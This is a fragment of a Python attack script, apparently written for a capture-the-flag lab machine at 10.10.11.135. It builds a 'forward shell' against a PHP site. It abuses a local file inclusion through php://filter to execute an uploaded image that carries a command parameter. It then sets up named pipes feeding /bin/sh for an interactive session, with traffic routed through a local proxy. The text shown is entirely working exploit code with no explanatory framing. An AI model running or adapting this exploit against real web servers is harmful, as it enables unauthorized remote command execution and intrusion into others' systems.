...
class WebShell(object):
    ...
    def __init__(self, interval=1.3, proxies='http://127.0.0.1:8080'):
        # MODIFY THIS, URL
        self.url = r"http://10.10.11.135/image.php"
        ...
        MakeNamedPipes = f"mkfifo {self.stdin}; tail -f {self.stdin} | /bin/sh 2>%261 > {self.stdout}"
    ...
    def RunRawCmd(self, cmd, timeout=50, proxy="http://127.0.0.1:8080"):
        ...
        payload = f"?img=php://filter/resource=images/uploads/0c204634dae1bf492e84741e964d4f6a_game.jpg&cmd={cmd}"
        ...
        try:
            r = requests.get(self.url + payload, proxies=proxies, timeout=timeout)
            return r.text
        except:
            pass
